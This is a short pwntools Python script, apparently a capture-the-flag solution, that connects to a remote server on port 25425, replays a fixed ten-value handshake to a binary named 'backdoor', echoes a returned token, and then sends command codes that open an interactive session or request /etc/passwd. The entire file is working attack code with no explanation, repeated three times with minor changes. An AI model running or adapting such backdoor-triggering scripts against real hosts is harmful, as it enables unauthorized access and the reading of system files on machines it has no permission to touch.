from pwn import *

hands = [
	0x124eac80fc0062b2,
	0xc5be0fd1d3acaa67,
	0x34dd2228a6a43282,
	0x1159339b541e56f1,
	0x70aca735b2bf7e6c,
	0x526c90e12ddf390b,
	0x98d85286c110b659,
	0x7e1431f33ce72aaa,
	0x5ff07e1e75f088e3,
	0x760fe253bef08ed1
]

# p = process("./backdoor")
# p = remote("localhost", 25425)
p = remote("34.87.186.254", 25425)

for x in hands:
    p.send(p64(x))
    p.recvuntil(b"\xef")

ball = p.recv(8)
p.send(ball)
p.recvuntil(b"\xef")

p.sendline(str(0xabcc).encode())

p.interactive()

# p = remote("localhost", 25425)
p = remote("34.87.186.254", 25425)

for x in hands:
    p.send(p64(x))
    p.recvuntil(b"\xef")

ball = p.recv(8)
p.send(ball)
p.recvuntil(b"\xef")

p.sendline(str(0xabca).encode())
p.sendline(b"/etc/passwd")

p.interactive()
# p = remote("localhost", 25425)
p = remote("34.87.186.254", 25425)

for x in hands:
    p.send(p64(x))
    p.recvuntil(b"\xef")

ball = p.recv(8)
p.send(ball)
p.recvuntil(b"\xef")

p.sendline(str(0xabcb).encode())

p.interactive()
